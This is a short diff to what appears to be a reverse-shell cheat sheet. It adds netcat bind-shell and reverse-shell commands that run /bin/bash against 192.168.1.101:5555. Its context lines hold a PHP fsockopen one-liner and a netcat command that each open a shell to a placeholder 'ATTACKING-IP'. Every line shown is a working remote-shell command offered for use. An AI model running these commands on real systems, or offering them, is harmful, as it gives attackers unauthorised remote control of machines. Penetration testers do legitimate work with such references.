@@ -33,6 +33,19 @@ php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ## Netcat
 
+
+Bind shell
+```
+nc -vlp 5555 -e /bin/bash
+nc 192.168.1.101 5555
+```
+
+Reverse shell
+```
+nc 192.168.1.101 5555 -e /bin/bash
+nc -lvp 5555
+```
+
 ```
 nc -e /bin/sh ATTACKING-IP 80
 ```
